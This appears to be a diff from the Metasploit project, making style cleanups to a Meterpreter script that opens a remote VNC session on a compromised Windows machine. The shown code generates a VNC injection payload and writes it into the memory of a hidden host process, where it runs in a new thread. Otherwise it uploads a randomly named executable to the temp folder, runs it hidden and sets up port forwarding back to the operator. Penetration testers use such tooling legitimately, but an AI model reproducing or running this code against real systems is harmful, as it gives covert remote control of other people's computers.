@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 #
 # Meterpreter script for obtaining a quick VNC session
@@ -32,15 +32,14 @@ opts = Rex::Parser::Arguments.new(
 # Default parameters
 #
 
-if (client.sock and client.sock.respond_to? :peerhost and client.sock.peerhost)
-  rhost    = Rex::Socket.source_address(client.sock.peerhost)
-else
-  rhost    = Rex::Socket.source_address("1.2.3.4")
-end
+rhost = if client.sock && client.sock.respond_to?(:peerhost) && client.sock.peerhost
+          Rex::Socket.source_address(client.sock.peerhost)
+        else
+          Rex::Socket.source_address("1.2.3.4")
+        end
 rport    = 4545
 vport    = 5900
 lhost    = "127.0.0.1"
-
 
 autoconn = true
 autovnc  = true
@@ -54,7 +53,7 @@ pay      = nil
 #
 # Option parsing
 #
-opts.parse(args) do |opt, idx, val|
+opts.parse(args) do |opt, _idx, val|
   case opt
   when "-h"
     print_line(opts.usage)
@@ -83,7 +82,7 @@ opts.parse(args) do |opt, idx, val|
   end
 end
 
-#check for proper Meterpreter Platform
+# check for proper Meterpreter Platform
 def unsupported
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
@@ -93,7 +92,7 @@ unsupported if client.platform !~ /win32|win64/i
 #
 # Create the raw payload
 #
-if (tunnel)
+if tunnel
   print_status("Creating a VNC bind tcp stager: RHOST=#{lhost} LPORT=#{rport}")
   payload = "windows/vncinject/bind_tcp"
 
@@ -111,13 +110,9 @@ else
   pay.datastore['VNCPORT'] = vport
 end
 
-if (not courtesy)
-  pay.datastore['DisableCourtesyShell'] = true
-end
+pay.datastore['DisableCourtesyShell'] = true unless courtesy
 
-if (anyaddr)
-  pay.datastore['VNCHOST'] = "0.0.0.0"
-end
+pay.datastore['VNCHOST'] = "0.0.0.0" if anyaddr
 
 if autoconn
   mul = client.framework.exploits.create("multi/handler")
@@ -139,16 +134,16 @@ if autoconn
 end
 
 raw = pay.generate
-if (inject)
+if inject
   #
   # Create a host process
   #
-  pid = client.sys.process.execute("#{runme}", nil, {'Hidden' => 'true'}).pid
+  pid = client.sys.process.execute(runme.to_s, nil, 'Hidden' => 'true').pid
   print_status("Host process #{runme} has PID #{pid}")
   host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
   mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
 
-  print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
+  print_status("Allocated memory at address #{'0x%.8x' % mem}, for #{raw.length} byte stager")
   print_status("Writing the VNC stager into memory...")
   host_process.memory.write(mem, raw)
   host_process.thread.create(mem, 0)
@@ -160,7 +155,7 @@ else
   # Upload to the filesystem
   #
   tempdir = client.sys.config.getenv('TEMP')
-  tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
+  tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8) + 6)) + ".exe"
   tempexe.gsub!("\\\\", "\\")
 
   fd = client.fs.file.new(tempexe, "wb")
@@ -172,7 +167,7 @@ else
   # Execute the agent
   #
   print_status("Executing the VNC agent with endpoint #{rhost}:#{rport}...")
-  pid = session.sys.process.execute(tempexe, nil, {'Hidden' => true})
+  pid = session.sys.process.execute(tempexe, nil, 'Hidden' => true)
 end
 
 if tunnel
@@ -180,4 +175,3 @@ if tunnel
   print_status("Starting the port forwarding from #{rport} => TARGET:#{rport}")
   client.run_cmd("portfwd add -L 127.0.0.1 -l #{rport} -p #{rport} -r #{lhost}")
 end
-
